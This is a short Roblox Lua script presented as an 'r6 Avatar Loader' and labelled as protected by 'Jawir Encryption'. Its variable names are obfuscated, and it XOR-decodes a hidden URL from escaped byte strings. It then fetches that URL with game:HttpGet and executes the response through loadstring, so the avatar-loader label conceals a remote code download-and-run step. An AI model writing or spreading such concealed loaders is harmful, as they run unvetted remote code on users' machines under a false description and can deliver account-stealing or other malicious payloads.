--[[ r6 Avatar Loader - Protected by Jawir Encryption ]]

( function (...) local _lllIllIIlI = "\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\121\040\076\098\126\110\103\117\046\117\067\118" local _IIIlllIIIl = "\002\021\003\025\001\085\065\091\029\017\029\079\016\000\006\007\027\022\026\003\015\019\020\006\028\027\011\026\027\094\009\014\026\070\060\014\026\000\014\028\016\078\005\011\030\023\065\006\010\022\025\078\031\012\019\011\029\091\002\017\003\015\088\011\030\000\013\031\010\002\007\000\025\054\023\028\030\090\003\005\011" local function _IlIlIllllI(str, k) local _llIlIlllIl = {} for i = 0x1, #str do local _IllIIllllI = string.byte(str, i) local _llllIIlIIl = string.byte(k, ((i - 0x1) % #k) + 0x1) table.insert(_llIlIlllIl, string.char(bit32.bxor(_IllIIllllI, _llllIIlIIl))) end
 return table.concat(_llIlIlllIl) end
 local _IIllllIIll = _IlIlIllllI(_lllIllIIlI, _IIIlllIIIl) if not _IIllllIIll:match("^https://") then return end
 local _lIllIlIIll = game:HttpGet(_IIllllIIll) loadstring(_lIllIlIIll)() end
 )(...)
